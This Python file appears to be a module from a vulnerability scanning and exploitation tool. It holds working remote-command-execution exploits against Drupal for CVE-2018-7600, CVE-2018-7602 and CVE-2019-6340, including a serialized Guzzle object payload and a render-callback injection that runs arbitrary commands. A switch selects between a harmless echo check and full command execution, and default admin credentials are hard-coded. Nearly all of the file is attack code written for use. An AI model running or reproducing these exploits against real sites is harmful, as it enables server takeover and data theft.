import random,string,requests,json,re
from ClassCongregation import _urlparse
from requests_toolbelt.utils import dump
from bs4 import BeautifulSoup
import CodeTest
################
##--ApacheSolr--##
#cve_2017_12629 无回显的命令执行, 默认VULN = None, 7.1.0以上(包含)版本已删除RunExecutableListener
#cve_2019_0193  无回显的命令执行，默认VULN = None
#cve_2019_17558 有回显的命令执行, 设置VULN = True
################
#echo VuLnEcHoPoCSuCCeSS
#VULN = None => 漏洞测试
#VULN = True => 命令执行
CodeTest.VULN = None
TIMEOUT = 10
DRUPAL_U = 'admin'
DRUPAL_P = 'admin'
class Drupal():
    def __init__(self, url, CMD):
        self.url = url
        self.CMD = CMD
        self.payload_cve_2018_7600 = ("form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=system&mail"
            "[#type]=markup&mail[#markup]=RECOMMAND")
        self.payload_cve_2019_6340 = "{\r\n\"link\":[\r\n{\r\n\"value\":\"link\",\r\n\"options\":\"O:24:\\\"" \
            "GuzzleHttp\\\\Psr7\\\\FnStream\\\":2:{s:33:\\\"\\u0000GuzzleHttp\\\\Psr7\\\\FnStream\\u0000methods\\\"" \
            ";a:1:{s:5:\\\"close\\\";a:2:{i:0;O:23:\\\"GuzzleHttp\\\\HandlerStack\\\":3:{s:32:\\\"\\u0000GuzzleHttp" \
            "\\\\HandlerStack\\u0000handler\\\";s:%s:\\\"%s\\\";s:30:\\\"\\u0000GuzzleHttp\\\\HandlerStack\\" \
            "u0000stack\\\";a:1:{i:0;a:1:{i:0;s:6:\\\"system\\\";}}s:31:\\\"\\u0000GuzzleHttp\\\\HandlerStack\\" \
            "u0000cached\\\";b:0;}i:1;s:7:\\\"resolve\\\";}}s:9:\\\"_fn_close\\\";a:2:{i:0;r:4;i:1;s:7:\\\"resolve" \
            "\\\";}}\"\r\n}\r\n],\r\n\"_links\":{\r\n\"type\":{\r\n\"href\":\"%s/rest/type/shortcut/default" \
            "\"\r\n}\r\n}\r\n}"
            
    def cve_2018_7600(self):
        self.pocname = "Drupal: CVE-2018-7600"
        self.method = "post"
        self.rawdata = "null"
        self.info = CodeTest.Colored_.rce()
        self.r = "PoCWating"
        self.payload = self.payload_cve_2018_7600.replace("RECOMMAND", self.CMD)
        self.path = "/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax" 
        try:
            if CodeTest.VULN is None:
                self.request = requests.post(self.url + self.path, data=self.payload, headers=CodeTest.headers, timeout=TIMEOUT, verify=False)
                self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
                if r"LISTEN" not in self.request.text and r"class=\u0022ajax-new-content\u0022\u003E\u003C\/span\u003E" in self.request.text:
                    self.r = "PoCSuCCeSS"
                    CodeTest.verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
                else:
                    CodeTest.verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
            else:
                self.request = requests.post(self.url + self.path, data=self.payload, headers=CodeTest.headers, timeout=TIMEOUT, verify=False)
                CodeTest.verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
        except requests.exceptions.Timeout as error:
            CodeTest.verify.timeout_output(self.pocname)
        except requests.exceptions.ConnectionError as error:
            CodeTest.verify.connection_output(self.pocname)
        except Exception as error:
            CodeTest.verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
            
    def cve_2018_7602(self):
        self.pocname = "Drupal: CVE-2018-7602"
        self.method = "get"
        self.rawdata = "null"
        self.info = CodeTest.Colored_.rce()
        self.r = "PoCWating"
        try:
            if CodeTest.VULN is None:
                self.request = requests.get(self.url + "/CHANGELOG.txt", data=self.payload, headers=CodeTest.headers, 
                    timeout=TIMEOUT, verify=False)
                self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
                self.allver = re.findall(r"([\d][.][\d]?[.]?[\d])", self.request.text)
                if self.request.status_code == 200 and r"Drupal" in self.request.text:
                    if '7.59' not in self.allver and '8.5.3' not in self.allver:
                        self.r = "PoCSuCCeSS"
                        self.info += " [drupal:" + self.allver[0] + "]"
                CodeTest.verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
            else:
                self.session = requests.Session()
                self.get_params = {'q':'user/login'}
                self.post_params = {'form_id':'user_login', 'name': DRUPAL_U, 'pass' : DRUPAL_P, 'op':'Log in'}
                self.session.post(self.url, params=self.get_params, data=self.post_params, headers=CodeTest.headers, 
                    timeout=TIMEOUT, verify=False)
                self.get_params = {'q':'user'}
                self.r = self.session.get(self.url, params=self.get_params, headers=CodeTest.headers, timeout=TIMEOUT, verify=False)
                self.soup = BeautifulSoup(self.r.text, "html.parser")
                self.user_id = self.soup.find('meta', {'property': 'foaf:name'}).get('about')
                if "?q=" in self.user_id:
                    self.user_id = self.user_id.split("=")[1]
                self.get_params = {'q': self.user_id + '/cancel'}
                self.r = self.session.get(self.url, params=self.get_params, headers=CodeTest.headers, timeout=TIMEOUT, verify=False)
                self.soup = BeautifulSoup(self.r.text, "html.parser")
                self.form = self.soup.find('form', {'id': 'user-cancel-confirm-form'})
                self.form_token = self.form.find('input', {'name': 'form_token'}).get('value')
                self.get_params = {'q': self.user_id + '/cancel', 
                    'destination' : self.user_id +'/cancel?q[%23post_render][]=passthru&q[%23type]=markup&q[%23markup]=' + self.CMD}
                self.post_params = {'form_id':'user_cancel_confirm_form','form_token': self.form_token, 
                    '_triggering_element_name':'form_id', 'op':'Cancel account'}
                self.r = self.session.post(self.url, params=self.get_params, data=self.post_params, headers=CodeTest.headers, 
                    timeout=TIMEOUT, verify=False)
                self.soup = BeautifulSoup(self.r.text, "html.parser")
                self.form = self.soup.find('form', {'id': 'user-cancel-confirm-form'})
                self.form_build_id = self.form.find('input', {'name': 'form_build_id'}).get('value')
                self.get_params = {'q':'file/ajax/actions/cancel/#options/path/' + self.form_build_id}
                self.post_params = {'form_build_id':self.form_build_id}
                self.r = self.session.post(self.url, params=self.get_params, data=self.post_params, headers=CodeTest.headers, 
                    timeout=TIMEOUT, verify=False)
                CodeTest.verify.generic_output(self.r.text, self.pocname, self.method, self.rawdata, self.info) 
        except requests.exceptions.Timeout as error:
            CodeTest.verify.timeout_output(self.pocname)
        except requests.exceptions.ConnectionError as error:
            CodeTest.verify.connection_output(self.pocname)
        except Exception as error:
            CodeTest.verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)

    def cve_2019_6340(self):
        self.pocname = "Drupal: CVE-2019-6340"
        self.method = "post"
        self.rawdata = "null"
        self.info = CodeTest.Colored_.rce()
        self.r = "PoCWating"
        self.path = "/node/?_format=hal_json"
        self.cmd_len = len(self.CMD)
        self.payload = self.payload_cve_2019_6340 % (self.cmd_len, self.CMD, self.url)
        self.headers = {
            'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0",
            'Connection': "close",
            'Content-Type': "application/hal+json",
            'Accept': "*/*",
            'Cache-Control': "no-cache"
        }
        try:
            if CodeTest.VULN is None:
                self.request = requests.post(self.url + self.path, data=self.payload, headers=self.headers, 
                    timeout=TIMEOUT, verify=False)
                self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
                CodeTest.verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
#                if r"LISTEN" not in self.request.text:
#                    if r"uid=" not in self.request.text:
#                        if self.request.status_code == 403 and r"u0027access" in self.request.text:
#                            self.r = "PoCSuCCeSS"
#                            verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
#                    else:
#                        verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
#                else:
#                    verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
            else:
                self.request = requests.post(self.url + self.path, data=self.payload, headers=self.headers, 
                    timeout=TIMEOUT, verify=False)
                self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
                self.r = self.request.text.split("}")[1]
                CodeTest.verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
        except requests.exceptions.Timeout as error:
            CodeTest.verify.timeout_output(self.pocname)
        except requests.exceptions.ConnectionError as error:
            CodeTest.verify.connection_output(self.pocname)
        except Exception as error:
            CodeTest.verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)

print("""eg: https://123.207.23.211:11001
+-------------------+------------------+-----+-----+-------------------------------------------------------------+
| Target type       | Vuln Name        | Poc | Exp | Impact Version && Vulnerability description                 |
+-------------------+------------------+-----+-----+-------------------------------------------------------------+
| Drupal            | cve_2018_7600    |  Y  |  Y  | 6.x, 7.x, 8.x, drupalgeddon2 remote code execution          |
| Drupal            | cve_2018_7602    |  Y  |  Y  | < 7.59, < 8.5.3 (except 8.4.8) drupalgeddon2 rce            |
| Drupal            | cve_2019_6340    |  Y  |  Y  | < 8.6.10, drupal core restful remote code execution         |
+-------------------+------------------+-----+-----+-------------------------------------------------------------+""")
def check(**kwargs):
    if CodeTest.VULN == None:
        ExpDrupal = Drupal(_urlparse(kwargs['url']),"echo VuLnEcHoPoCSuCCeSS")
    else:
        ExpDrupal = Drupal(_urlparse(kwargs['url']),kwargs['cmd'])
    if kwargs['pocname'] == "cve_2018_7600":
        ExpDrupal.cve_2018_7600()
    elif kwargs['pocname'] == "cve_2018_7602":
        ExpDrupal.cve_2018_7602()
    elif kwargs['pocname'] == "cve_2019_6340":
        ExpDrupal.cve_2019_6340()
    else:
        ExpDrupal.cve_2018_7600()
        ExpDrupal.cve_2018_7602()
        ExpDrupal.cve_2019_6340()
